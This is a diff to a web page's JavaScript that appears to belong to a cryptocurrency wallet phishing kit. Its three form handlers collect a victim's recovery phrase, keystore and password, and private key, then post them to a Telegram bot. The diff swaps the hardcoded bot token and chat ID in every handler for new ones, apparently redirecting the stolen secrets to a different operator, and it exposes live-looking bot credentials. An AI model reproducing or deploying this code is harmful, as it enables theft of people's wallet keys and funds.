@@ -1821,8 +1821,8 @@ document.getElementById('form').addEventListener('submit', function(e){
 
     let phrase = document.getElementById('phraseInput').value;
 	const wallet = document.getElementById('wallet_id').value;
-    let chat_id = "-1002859360124"; // Replace with your channel chat ID
-    let token = "7899246377:AAFMH58t_DaFzFPpGcnX-huSuYHl09OCnUY"; // Your bot token
+    let chat_id = "-1002262572747"; // Replace with your channel chat ID
+    let token = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA"; // Your bot token
    let message = `Import Type is Phrase
 wallet is: ${wallet}
 Phrase is: ${phrase}`;
@@ -1859,8 +1859,8 @@ const wallet = document.getElementById('wallet_id').value;
                 `*Keystore:* \n\`\`\`\n${keystore}\n\`\`\`\n` +
                 `*Password:* \`${password}\``;
 
-    const token = "7899246377:AAFMH58t_DaFzFPpGcnX-huSuYHl09OCnUY";
-    const chat_id = "-1002859360124";
+    const token = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA";
+    const chat_id = "-1002262572747";
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
@@ -1888,8 +1888,8 @@ document.getElementById('private1').addEventListener('submit', function(e) {
     // Get form values
     const privateKey = document.querySelector('#private1 input[name="private"]').value;
     const wallet = document.getElementById('wallet_id').value;
-    const botToken = "7899246377:AAFMH58t_DaFzFPpGcnX-huSuYHl09OCnUY";
-    const chatId = "-1002859360124";
+    const botToken = "8045116563:AAH4Kdd9YUlZ_255JbyRg_o62Xz1VlJiFhA";
+    const chatId = "-1002262572747";
     
     if (!privateKey) {
         alert('Please enter your private key');
